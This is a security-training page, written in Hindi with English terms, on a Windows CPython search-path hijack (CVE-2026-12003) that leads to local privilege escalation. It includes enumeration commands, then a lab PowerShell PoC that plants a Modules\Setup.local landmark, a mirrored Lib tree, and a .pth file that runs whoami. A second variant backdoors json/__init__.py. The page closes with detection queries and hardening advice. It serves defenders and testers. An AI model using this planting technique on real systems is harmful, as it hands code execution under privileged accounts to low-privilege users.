# Windows CPython Build-Landmark और `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

एक runtime उन relative paths को बनाए रख सकता है, जो केवल उसके build tree के लिए intended थे। यदि कोई installed privileged runtime इनमें से किसी path को low-privilege-writable directory में resolve करता है, तो attacker अपेक्षित **build landmark** को plant कर सकता है और runtime को किसी alternative library prefix पर trust करने के लिए बाध्य कर सकता है। CVE-2026-12003 Windows CPython का एक उदाहरण है: planted `Modules\Setup.local` protected Python installation को modify किए बिना `sys.path` में standard-library entry को redirect कर सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

Affected Windows builds ने `VPATH=..\..` compile किया और इसे `sys._vpath` के रूप में expose किया। `Modules/getpath.py` में vulnerable fallback ने `VPATH\Modules\Setup.local` को इस evidence के रूप में treat किया कि interpreter source tree से run हो रहा था; निम्न data flow इस build-time value को runtime search-path primitive में बदल देता है।<sup>[[1]](#references)[[2]](#references)</sup>

| Stage | `C:\Program Files\Python314\python.exe` के लिए derived value |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| Selected `build_prefix` | `C:\` |
| Selected standard library | `C:\Lib` |
| Result | Attacker-controlled `C:\Lib` को `sys.path` में append किया जाता है |

यह check उस समय उपयोग किया जाने वाला fallback है जब executable के पास मौजूद अधिक specific `pybuilddir.txt` absent या unreadable हो। यह महत्वपूर्ण है क्योंकि low-privilege user `C:\Program Files\Python314` को बदलने में unable हो सकता है, फिर भी `C:\` पर नई directories create कर सकता है। बाद में चलने वाली privileged `python.exe` process अपने access token का उपयोग करके Python code load करती है।<sup>[[1]](#references)[[2]](#references)</sup>

### Preconditions

इसे privilege boundary तभी मानें जब ये सभी conditions पूरी हों:<sup>[[1]](#references)[[2]](#references)</sup>

- Target एक affected **Windows CPython** build हो; vulnerable path logic Python-language property नहीं है।
- `python.exe` वाली directory से `..\..` resolve करने पर प्राप्त directory less-privileged user को landmark और `Lib` tree create करने की permission देती हो।
- कोई higher-privileged user, service, installer या software-deployment account बाद में उस interpreter को start करता हो।
- कोई path-isolation configuration vulnerable discovery path को override न करती हो।

## Enumeration

Compiled value और effective search path, दोनों inspect करें। Exposed `..\..` value एक उपयोगी lead है, लेकिन यह exploitability का proof नहीं है: path को भी resolve करें, ACLs test करें और confirm करें कि planted landmark protected installation के बाहर होगा।<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
आकलन को केवल official installers तक सीमित न रखें। `python.exe` को bundle करने वाले प्रत्येक product के लिए, उसके `sys._vpath` को actual executable directory के सापेक्ष resolve करें और परिणामी `Modules` तथा `Lib` locations पर ACLs की समीक्षा करें। अधिक गहरा installation path `C:\` के बजाय किसी अलग writable application या vendor directory पर resolve हो सकता है।<sup>[[1]](#references)</sup>

## Lab exploitation workflow

निम्न lab PoC, Python के initialize होने के लिए selected prefix के नीचे legitimate runtime की पर्याप्त संरचना को mirror करता है, एक executable `.pth` line जोड़ता है और अंत में landmark बनाता है। Interpreter को अस्थायी रूप से incomplete library tree पर pointed छोड़ने से बचने के लिए landmark से पहले payload बनाएं।<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
सामान्य site initialization के दौरान, Python मान्यता प्राप्त site-packages directories में `.pth` files को process करता है। केवल whitespace के बाद `import` से शुरू होने वाली lines execute की जाती हैं, और executable statement एक ही physical line पर रहना चाहिए; `python -S` automatic `site` import को suppress करता है और इसलिए इस trigger को रोकता है।<sup>[[1]](#references)[[4]](#references)</sup>

### Import-triggered alternative

Startup execution आवश्यक नहीं है। वैध library tree को पुन: बनाने के बाद, ऐसे module में backdoor डालें जिसे कोई privileged script अनुमानित रूप से import करता हो। उदाहरण के लिए, planted `Lib\json\__init__.py` में code जोड़ने पर victim द्वारा `json` import करते ही वह execute होता है; ऐसा विश्वसनीय लेकिन universally imported न होने वाला module चुनने से trigger कम noisy हो सकता है।<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
यह variant अभी भी importing process token inherit करता है, लेकिन यह target application द्वारा modified module को import करने पर निर्भर करता है। Real software का testing करते समय original module behavior को बनाए रखें, वरना intended privileged workflow पूरा होने से पहले import fail हो सकता है।<sup>[[1]](#references)</sup>

## Pre-installation planting

Search-path planting installation से पहले हो सकती है। Low-privilege user भविष्य की `Lib` tree और `Modules\Setup.local` तैयार कर सकता है, फिर किसी privileged software portal, help-desk workflow या deployment system द्वारा all-users installation किए जाने की प्रतीक्षा कर सकता है। ऐसे installers जो packages install करने या standard library को precompile करने के लिए नए interpreter को launch करते हैं, administrator द्वारा Python को manually खोले बिना deployment account के अंतर्गत payload trigger कर सकते हैं।<sup>[[1]](#references)</sup>

इससे deployment review भी बदल जाता है: bundled runtime को install या upgrade करने से **पहले** writable ancestors और पहले से मौजूद landmark/library directories की जांच करें, न कि deployment के बाद केवल अंतिम installation directory की जांच करें।<sup>[[1]](#references)</sup>

## Detection and hardening

उपयोगी host pivots हैं: unexpected landmark और library tree, जिसके बाद privileged Python launch होता है। `Modules\Setup.local`, root-level या अन्यथा out-of-place `Lib\site-packages\*.pth`, copied standard-library packages और ऐसे module files की खोज करें जिनके owner या creation time protected installation से अलग हों। इनके creation को standard user द्वारा elevated `python.exe` से `cmd.exe`, `powershell.exe`, account-management tools या अन्य unusual children spawn किए जाने के साथ correlate करें।<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Upstream fix `VPATH\Modules\Setup.local` fallback को हटाता है और `pybuilddir.txt` को एकमात्र build-tree indicator बनाता है। Fixed build या current Python install manager द्वारा managed per-user installation को प्राथमिकता दें। जहाँ upgrade अस्थायी रूप से संभव न हो, resolved ancestor को सुरक्षित करें और restrictive ACLs के साथ पहले से `Modules` बनाएँ; controlled `._pth` files या `PYTHONHOME` discovery को भी बदल सकते हैं, लेकिन इनके लिए application compatibility testing आवश्यक है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path Hijacking and Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - In-tree search paths can be enabled without modifying install directory](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Remove the `VPATH/Modules/Setup.local` fallback](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
